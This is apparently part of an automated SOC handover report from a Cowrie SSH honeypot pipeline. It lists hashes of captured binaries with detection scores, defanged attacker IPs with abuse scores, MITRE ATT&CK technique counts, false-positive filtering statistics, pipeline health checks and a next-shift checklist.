| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/74** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `3.130.168[.]2` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `152.89.170[.]227` | IT | Lumanex | **100** ⚠️ | 17 |
| `52.90.76[.]255` | US | Amazon Technologies Inc. | **100** ⚠️ | 22 |
| `116.47.238[.]46` | KR | LG POWERCOMM | **100** ⚠️ | 29 |
| `85.186.121[.]137` | RO | UPC Romania IASI | **100** ⚠️ | 6 |
| `20.119.74[.]72` | US | Microsoft Corporation | **100** ⚠️ | 0 |
| `185.85.18[.]91` | DK | VPS | **79** | 0 |
| `217.76.61[.]33` | FR | Contabo GmbH | **75** | 0 |
| `177.73.216[.]128` | BR | INFINITY FIBRA TELECOMUNICACOES LTDA | **74** | 1 |
| `69.6.225[.]57` | CL | Newfold Digital, Inc. | **74** | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 60 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 29 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 28 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 14 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 14 |

---

## 🔕 False Positive Summary (1020 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 16 below threshold 25 | 35 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 8 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 976 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 1111 cases |
| Tool 34  | Credential Extractor        | ✅ 57 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 26 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 1020 filtered (91.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 25 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 26 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 28 priority case(s) shown individually · 6 recon entry/entries in table (4 group(s) consolidating 61 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-02T13:20:42Z_
